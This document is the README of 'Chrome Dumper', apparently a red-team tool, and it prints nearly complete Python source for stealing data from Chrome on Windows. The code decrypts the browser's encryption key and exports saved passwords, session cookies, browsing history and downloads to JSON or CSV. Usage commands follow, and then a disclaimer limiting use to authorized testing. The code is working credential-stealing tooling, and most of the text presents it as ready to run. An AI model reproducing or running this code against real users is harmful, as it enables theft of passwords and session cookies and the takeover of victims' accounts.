# Table of Contents

* [Technical Details](#technical-Details)
    * [Chrome's Timestamp](#Chromes-Timestamp)
    * [Data Encryption](#data-encryption)
    * [Data Decryption](#data-decryption)
    * [Passwords Investigation](#passwords-investigation)
    * [Downloads Investigation](#downloads-investigation)
    * [History Investigation](#history-investigation)
    * [Cookies Investigation](#cookies-investigation)
    * [Main Function](#main-function)
* [Instalation](#instalation)
    * [Dependency Requirements](#dependency-requirements)
* [Usage](#usage)
    * [Module Selection](#module-selection)
    * [Output Format](#output-format)
    * [Chrome Profile Selection](#chrome-profile-selection)
    * [Chrome User Data Path](#chrome-user-data-path)
* [Disclaimer-and Usage Notice](#disclaimer-and-usage-notice)

## Technical Details

#### Chrome's Timestamp

The `get_chrome_datetime` function plays a crucial role in the Chrome Dumper script by converting Chrome's unique timestamp format to a standard `datetime` object in Python. Chrome stores timestamps as the number of microseconds since January 1, 1601. This function takes the Chrome timestamp as input, performs the necessary calculations, and returns a `datetime` object representing the corresponding date and time in the Gregorian calendar.

Example:
```python
def get_chrome_datetime(chromedate):
      return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
```

By utilizing the `get_chrome_datetime` function, red teamers can seamlessly work with Chrome's timestamp format and perform various time-based analyses on extracted data. This function simplifies the process of converting Chrome timestamps and enables easier correlation with other time-related information during investigations or data analysis tasks.

#### Data Encryption

The `get_encryption_key` function serves a critical purpose in the Chrome Dumper script by extracting the encryption key required to decrypt sensitive data stored by the Chrome browser. Chrome encrypts certain sensitive information, such as passwords and cookies, to enhance security. To access and decrypt this data, the function retrieves the encrypted key from the Chrome profile's 'Local State' file, decodes it, and then decrypts it using the `CryptUnprotectData` function from the `win32crypt` library.

Example:
```python
def get_encryption_key(chrome_profile_dir):
    local_state_path = os.path.join(chrome_profile_dir, 'Local State')

    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]

    return decrypted_key
```

By utilizing the `get_encryption_key` function, red teamers can acquire the necessary encryption key to decrypt sensitive data obtained during reconnaissance or data extraction. This function simplifies the process of retrieving and decrypting the key, allowing red teamers to access and analyze the valuable information stored securely by the Chrome browser. It is a crucial step in the data extraction process and ensures that red teamers can efficiently access and leverage sensitive information during engagements.

#### Data Decryption

The `decrypt_data` function is a vital component of the Chrome Dumper script, as it enables red teamers to decrypt encrypted data retrieved from the Chrome browser. It takes the encrypted data and the corresponding encryption key as input and applies the necessary decryption process to obtain the original plaintext information. The function utilizes the Advanced Encryption Standard (AES) in Galois/Counter Mode (GCM) to ensure secure and efficient decryption.

Example:
```python
def decrypt_data(data, key):
        iv, encrypted_data = data[3:15], data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_data = cipher.decrypt(encrypted_data)[:-16].decode()
        return decrypted_data
```

By leveraging the `decrypt_data` function, red teamers can effectively access and analyze sensitive information, such as passwords and cookies, which are encrypted by the Chrome browser. This function is an essential part of the data extraction process, ensuring that red teamers can uncover valuable insights during reconnaissance and penetration testing engagements. The secure and efficient decryption process guarantees that red teamers can handle encrypted data with confidence and accuracy.

#### Passwords Investigation

The `export_passwords` function is a fundamental feature of the Chrome Dumper script, enabling red teamers to extract stored passwords from the Chrome browser. It accesses the Chrome database file, where login credentials are securely stored, and retrieves essential information such as the origin URL, action URL, username, password, date created, and date last used. The function then decrypts the password data using the corresponding encryption key, obtained from the `get_encryption_key` function, ensuring that sensitive information is accessible in a usable format.

Example:
```python
def export_passwords(chrome_profile_dir):
    db_path = os.path.join(chrome_profile_dir, 'Default', 'Login Data')
    db = sqlite3.connect(db_path)
    cursor = db.cursor()

    cursor.execute("""
    SELECT 
        origin_url, action_url, username_value, password_value, date_created, date_last_used 
    FROM 
        logins 
    """)

    key = get_encryption_key(chrome_profile_dir)

    password_list = []
    column_names = [description[0] for description in cursor.description]
    for row in cursor.fetchall():
        element = dict(zip(column_names, row))
        element['password'] = decrypt_data(element.get('password_value'), key) if element.get('password_value') else None
        del element['password_value']
        element['date_created'] = get_chrome_datetime(element['date_created'])
        element['date_last_used'] = get_chrome_datetime(element['date_last_used'])
        password_list.append(element)

    cursor.close()
    db.close()

    return password_list
```

By utilizing the `export_passwords` function, red teamers can effectively gather valuable login credentials from the Chrome browser, which may grant access to sensitive accounts and systems. The function's integration with decryption and timestamp conversion mechanisms ensures that the extracted data is presented in a user-friendly and actionable format. Red teamers can leverage this function during reconnaissance and penetration testing activities to identify potential weak points in a target's security posture.

#### Downloads Investigation

The `export_downloads` function is a valuable feature of the Chrome Dumper script that enables red teamers to extract information about downloaded files from the Chrome browser. By accessing the Chrome history database, the function retrieves essential details such as the download site URL, start and end timestamps, download state, total bytes, received bytes, danger type, interrupt reason, last modified time, MIME type, referrer URL, tab URL, tab referrer URL, and additional flags. The function then converts the start and end timestamps to standard `datetime` objects using the `get_chrome_datetime` function, ensuring that the data is presented in a human-readable format.

Example:
```python
def export_downloads(chrome_profile_dir):
    db_path = os.path.join(chrome_profile_dir, 'Default', 'History')
    db = sqlite3.connect(db_path)
    cursor = db.cursor()
    cursor.execute("""
    SELECT
       site_url, end_time, start_time, state, total_bytes, received_bytes,
       danger_type, interrupt_reason, last_modified, mime_type, referrer,
       tab_url, tab_referrer_url, opened, transient
    FROM
        downloads
    """)

    download_list = []
    column_names = [description[0] for description in cursor.description]
    for row in cursor.fetchall():
        element = dict(zip(column_names, row))
        element['start_time'] = get_chrome_datetime(element['start_time'])
        element['end_time'] = get_chrome_datetime(element['end_time'])
        download_list.append(element)

    cursor.close()
    db.close()

    return download_list
```

By utilizing the `export_downloads` function, red teamers can effectively analyze a target's downloaded files, potentially revealing sensitive information or files that could be used as part of a broader attack strategy. The function's integration with the `get_chrome_datetime` function ensures that the timestamps are presented in a standardized format, simplifying the analysis process and facilitating time-based correlation with other extracted data.

#### History Investigation

The `export_history` function is a significant functionality in the Chrome Dumper script that allows red teamers to extract browsing history data from the Chrome browser. By accessing the Chrome history database, the function retrieves details such as the page title, URL, visit count, and last visit time for each visited website. The `last_visit_time` timestamp is then converted to a standard `datetime` object using the `get_chrome_datetime` function, ensuring that the time information is presented in a human-readable format.

Example:
```python
def export_history(chrome_profile_dir):
    db_path = os.path.join(chrome_profile_dir, 'Default', 'History')
    db = sqlite3.connect(db_path)
    cursor = db.cursor()

    cursor.execute("""
    SELECT 
        title, url, visit_count, last_visit_time
    FROM 
        urls
    """)

    history_list = []
    column_names = [description[0] for description in cursor.description]
    for row in cursor.fetchall():
        element = dict(zip(column_names, row))
        element['last_visit_time'] = get_chrome_datetime(element['last_visit_time'])
        history_list.append(element)

    cursor.close()
    db.close()

    return history_list
```

By utilizing the `export_history` function, red teamers can effectively analyze a target's browsing activities, potentially revealing valuable insights into their interests, preferences, and online behavior. The function's integration with the `get_chrome_datetime` function ensures that the timestamps are converted to a standard format, simplifying time-based analysis and facilitating correlation with other time-related data points. This information can be crucial during reconnaissance activities and identifying potential vulnerabilities in the target's browsing patterns.

#### Cookies Investigation

The `export_cookies` function is a crucial element of the Chrome Dumper script, allowing red teamers to extract cookies from the Chrome browser. Cookies often contain valuable information such as session tokens or authentication details, which can be leveraged during an attack. By accessing the Chrome cookies database, the function retrieves essential details such as the host key, cookie name, cookie value, creation time, last access time, expiration time, and encrypted value. The function then decrypts the cookie value using the corresponding encryption key obtained from the `get_encryption_key` function, ensuring that the sensitive data is accessible in a usable format.

Example:
```python
def export_cookies(chrome_profile_dir):
    db_path = os.path.join(chrome_profile_dir, 'Default', 'Network', 'Cookies')
    db = sqlite3.connect(db_path)
    cursor = db.cursor()

    cursor.execute("""
    SELECT 
        host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM 
        cookies
    """)

    key = get_encryption_key(chrome_profile_dir)

    cookie_list = []
    column_names = [description[0] for description in cursor.description]
    for row in cursor.fetchall():
        element = dict(zip(column_names, row))
        element['value'] = decrypt_data(element.get('value') or element.get('encrypted_value'), key)
        del element['encrypted_value']
        element['creation_utc'] = get_chrome_datetime(element['creation_utc'])
        element['last_access_utc'] = get_chrome_datetime(element['last_access_utc'])
        element['expires_utc'] = get_chrome_datetime(element['expires_utc'])
        cookie_list.append(element)

    cursor.close()
    db.close()

    return cookie_list
```

By utilizing the `export_cookies` function, red teamers can effectively gather valuable information stored in cookies, which may grant access to authenticated sessions or reveal user-specific preferences. The function's integration with decryption and timestamp conversion mechanisms ensures that the extracted data is presented in a human-readable and actionable format. Red teamers can leverage this function during reconnaissance and penetration testing engagements to identify potential security weaknesses in a target's web application.

#### Main Function

The `main` function serves as the central component of the Chrome Dumper script, orchestrating the execution of specific modules and handling the output formatting. It allows red teamers to choose the data they want to extract from the Chrome browser and specify the output format (JSON or CSV) for the results. The function utilizes command-line arguments to configure the module, output format, Chrome profile, and Chrome user data path.

Example:
```python
def main():

    modules = {
        'passwords': export_passwords, 
        'downloads': export_downloads, 
        'history': export_history, 
        'cookies': export_cookies
    }

    parser = argparse.ArgumentParser(description='Exports data from Google Chrome browser')
    parser.add_argument('-m', '--module', required=True, help='Script to run', choices=list(modules.keys()))
    parser.add_argument('-o', '--output', default='json', help='Output format', choices=['json', 'csv'])
    parser.add_argument('-p', '--profile', help='Chrome profile', default='User Data')
    parser.add_argument('--user-data', help='Chrome user data path', default=os.path.join(os.environ['USERPROFILE'], 'AppData\\Local\\Google\\Chrome'))

    args = parser.parse_args()

    result = modules[args.module](
        os.path.join(args.user_data, args.profile)
    )

    output_file = f'{args.module}.{args.output}'

    if args.output == 'json':
        with open(output_file, 'w') as fp:
            json.dump(result, fp, indent=4, sort_keys=True, default=str)
    else:
        with open(output_file, 'w', newline='', encoding='utf-8') as csv_file:
            writer = csv.DictWriter(csv_file, result[0].keys())
            writer.writeheader()
            writer.writerows(result)
```

By utilizing the `main` function with the appropriate command-line arguments, red teamers can easily extract specific data from the Chrome browser in their preferred format. The function streamlines the extraction process, making it efficient and flexible for various red team engagements, allowing valuable information to be obtained and analyzed for security assessment purposes.

## Installation

The ChromeDumper.py can be download by cloning the repo.

```
$ git clone https://github.com/M4rt1n3zz/ChromeDumper.git
```

#### Dependency Requirements

Before using the "Chrome Dumper" tool, ensure you have the following dependencies installed:

*  `pypiwin32`: This package provides access to many of the Windows API functions and is required for certain functionalities of the tool.  
* `pycryptodome`: This package is a self-contained Python package that provides cryptographic functions and is utilized in the "Chrome Dumper" tool for specific operations.

Please make sure to install these dependencies before running the tool. You can install them using `pip`, the Python package manager, by executing the following commands:
```
pip install pypiwin32
pip install pycryptodome
```
or 
```
pip install -r requirements.txt
```

Once you have installed the necessary dependencies, you'll be ready to use the "Chrome Dumper" tool effectively.

## Usage

#### Module Selection

The main function provides flexibility by allowing users to select the desired module for data extraction. The available modules include 'passwords', 'downloads', 'history', and 'cookies'. Users can specify the module using the command-line argument `-m` or `--module`.

Example:
```
C:\>python3 ChromeDumper.py -m passwords
```

#### Output Format

Users can choose the output format for the extracted data. The supported formats are JSON and CSV. By default, the output format is set to JSON. Users can specify the format using the command-line argument `-o` or `--output`.

Example:
```
C:\>python3 ChromeDumper.py -m history -o csv
```

#### Chrome Profile Selection

The main function allows users to specify the Chrome profile from which to extract data. By default, it uses the 'User Data' directory within the user's Chrome installation directory. Users can provide a different profile using the command-line argument `-p` or `--profile`.

Example:
```
C:\>python3 ChromeDumper.py -m downloads -p "Profile 2" -o csv
```

#### Chrome User Data Path

Users can customize the Chrome user data path if it differs from the default path. By default, it uses the user's Chrome installation directory. Users can provide a different path using the `--user-data` command-line argument.

Example:
```
C:\>python3 ChromeDumper.py -m cookies --user-data "C:\\Custom\\Chrome\\User Data" -o json
```

## Disclaimer and Usage Notice

>Before using the "Chrome Dumper" tool, please be aware that the tool is provided for legal and ethical purposes, such as red team engagements, penetration testing assessments, or other authorized security testing activities. Users are solely responsible for their actions and must comply with all applicable laws and ethical guidelines when utilizing the tool. It is essential to obtain explicit permission from the owner of any target system before running the tool. The creators and contributors of "Chrome Dumper" disclaim any liability for the misuse of the tool. By using the "Chrome Dumper" tool, you acknowledge and accept that you are solely responsible for any consequences resulting from its use. Always remember to prioritize responsible and ethical practices to maintain the security and integrity of all systems and data involved.


Created by [M4rt1n3zz](https://twitter.com/8U154R14N)


